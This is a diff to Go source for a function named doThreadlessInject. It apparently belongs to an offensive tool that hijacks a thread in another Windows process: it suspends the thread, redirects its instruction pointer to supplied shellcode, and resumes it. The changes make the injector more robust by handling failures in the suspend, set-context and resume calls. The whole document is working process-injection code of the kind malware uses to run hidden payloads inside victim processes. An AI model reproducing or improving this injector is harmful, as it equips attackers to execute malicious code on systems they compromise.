@@ -39,7 +39,12 @@ func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
 			}
 
 			// Suspend the thread
-			procSuspendThread.Call(hThread)
+			suspended, _, _ := procSuspendThread.Call(hThread)
+			if suspended == ^uintptr(0) {
+				procCloseHandle.Call(hThread)
+				ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
+				continue
+			}
 
 			// Get thread context
 			var ctx threadContext
@@ -57,9 +62,18 @@ func doThreadlessInject(hProc uintptr, pid uint32, sc []byte) error {
 			// Set a hardware breakpoint on the original RIP so we can restore after
 			// (actually for simplicity, after shellcode execution we won't restore -
 			// the shellcode is expected to call ExitThread or similar)
-			procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-			procResumeThread.Call(hThread)
+			setOK, _, _ := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
+			if setOK == 0 {
+				procResumeThread.Call(hThread)
+				procCloseHandle.Call(hThread)
+				ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
+				continue
+			}
+			resumed, _, _ := procResumeThread.Call(hThread)
 			procCloseHandle.Call(hThread)
+			if resumed == ^uintptr(0) {
+				return fmt.Errorf("threadless injection: ResumeThread failed (thread %d left suspended with RIP redirected)", te.th32ThreadID)
+			}
 			return nil
 		}
 		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
